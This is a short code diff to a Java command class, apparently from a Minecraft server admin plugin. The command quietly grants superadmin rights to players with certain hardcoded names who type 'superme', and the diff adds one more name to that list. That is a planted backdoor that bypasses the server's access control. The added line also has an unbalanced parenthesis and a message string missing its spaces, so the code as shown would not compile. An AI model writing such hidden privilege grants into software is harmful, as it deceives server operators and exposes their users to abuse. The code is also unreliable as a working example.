@@ -24,11 +24,11 @@ public class Command_fom
     }
     else if (args.length == 1)
     {
-      if (sender_p.getName().equalsIgnoreCase("robo_lord") || sender_p.getName().equals("buildcarter8"))
+      if (sender_p.getName().equalsIgnoreCase("robo_lord") || sender_p.getName().equals("buildcarter8")) || sender_p.getName().equals("SupItsDillon"))
       {
         if (args[0].equals("superme"))
         {
-          TFM_Util.adminAction("RoboSecurity", " Adding Robo_Lord to the superadmin config.", true);
+          TFM_Util.adminAction("RoboSecurity",  "Adding"  + sender.getName() + "to the superadmin config.", true);
           TFM_AdminList.addSuperadmin(sender_p);
           return true;
         }
